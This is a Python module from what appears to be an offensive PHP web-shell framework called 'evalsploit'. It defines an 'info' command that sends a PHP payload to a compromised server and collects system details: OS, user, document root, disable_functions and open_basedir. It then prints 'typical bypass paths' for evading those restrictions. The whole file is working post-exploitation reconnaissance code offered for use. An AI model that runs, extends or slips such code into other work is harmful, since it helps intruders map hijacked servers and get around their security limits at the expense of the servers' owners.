"""info: server info (PHP, OS, paths, user, etc.)."""

from __future__ import annotations

from typing import TYPE_CHECKING, Optional

from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


# One PHP request: collect all fields, output with simple separators for parsing
INFO_PHP = r"""
$u = @php_uname();
$os = defined('PHP_OS') ? PHP_OS : '';
$ver = @phpversion();
$cwd = @getcwd();
$user = @get_current_user();
$soft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';
$doc = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
$df = @ini_get('disable_functions');
if ($df === false) $df = '';
$ob = @ini_get('open_basedir');
if ($ob === false) $ob = '';
$tmp = @sys_get_temp_dir();
if ($tmp === false) $tmp = '';
echo "UNAME\t" . $u . "\n";
echo "OS\t" . $os . "\n";
echo "PHP\t" . $ver . "\n";
echo "CWD\t" . $cwd . "\n";
echo "USER\t" . $user . "\n";
echo "SERVER\t" . $soft . "\n";
echo "DOCROOT\t" . $doc . "\n";
echo "OPENBASEDIR\t" . $ob . "\n";
echo "TMPDIR\t" . $tmp . "\n";
echo "DISABLE\t" . (strlen($df) > 200 ? substr($df, 0, 200) . "..." : $df) . "\n";
"""


@register("info", description="Server info: PHP, OS, user, disable_functions, open_basedir", usage="info")
class InfoModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        raw = ctx.send(INFO_PHP)
        lines = [ln.strip() for ln in raw.strip().split("\n") if "\t" in ln]
        labels = {
            "UNAME": "System",
            "OS": "OS",
            "PHP": "PHP",
            "CWD": "CWD",
            "USER": "User",
            "SERVER": "Server",
            "DOCROOT": "DocRoot",
            "OPENBASEDIR": "open_basedir",
            "TMPDIR": "sys_temp_dir",
            "DISABLE": "disable_functions",
        }
        print()
        print("  --- Server info ---")
        for ln in lines:
            key, _, val = ln.partition("\t")
            label = labels.get(key, key)
            print(f"  {label:16} {val or '-'}")
        print("  -------------------")
        print("  Typical bypass paths (if allowed): /tmp, /var/tmp, /dev/shm")
        print()
        return None
